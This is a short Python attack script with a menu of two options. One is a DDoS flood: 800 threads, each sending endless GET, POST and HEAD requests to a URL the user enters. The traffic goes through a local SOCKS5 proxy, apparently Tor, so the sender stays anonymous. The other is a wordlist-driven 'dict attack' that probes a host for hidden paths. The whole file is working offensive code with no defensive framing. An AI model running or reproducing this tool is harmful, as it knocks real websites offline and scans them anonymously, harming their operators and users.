import requests, socks, random, socket, urllib3,sys
from threading import Thread
from requests.packages.urllib3.connectionpool import HTTPConnectionPool
from bs4 import BeautifulSoup as BS
from time import time, sleep

def _make_request(self,conn,method,url,**kwargs):
    response = self._old_make_request(conn,method,url,**kwargs)
    sock = getattr(conn,'sock',False)
    if sock:
        setattr(response,'peer',sock.getpeername())
    else:
        setattr(response,'peer',None)
    return response

def checkIP():
    ip = requests.get('http://checkip.dyndns.org').content
    soup = BS(ip, 'html.parser')
    print('From : ' + soup.find('body').text)


socks.set_default_proxy(socks.SOCKS5, "localhost", 9150)
socket.socket = socks.socksocket
HTTPConnectionPool._old_make_request = HTTPConnectionPool._make_request
HTTPConnectionPool._make_request = _make_request

url = input("input url: ")
def ddos_requests_send():
    print('START')
    while True:
        checkIP()
        requests.get(url)
        print("Sending get...")
        requests.post(url)
        print("Sending post...")
        requests.head(url)
        print("Sending head...")

def dict_attack():
    host = input(" Host: ")
    file = input(" File: ")
    data = open(file,"r")
    fdata = data.readlines()
    http = urllib3.PoolManager()

    for line in fdata:
        linewn = line.strip("\n")
        strreq = "{0}/{1}".format(host,linewn)
        print(strreq)
        try:
            print('1')
            response = http.request('GET', strreq)
            checkIP()
            print(response)
            http_status = response.status
            if http_status == 200:
                print(host + '/' + linewn + ' is Found (200 OK)')
        except:
            pass


if __name__ == '__main__':
    print('1. Ddos ')
    print('2. Dict attack ')
    choose = input(" Change: ")
    if choose=='1':
        for i in range(800):
            print(i)
            thr = Thread(target=ddos_requests_send)
            thr.start()
            sleep(1)
    elif choose=='2':
        dict_attack()



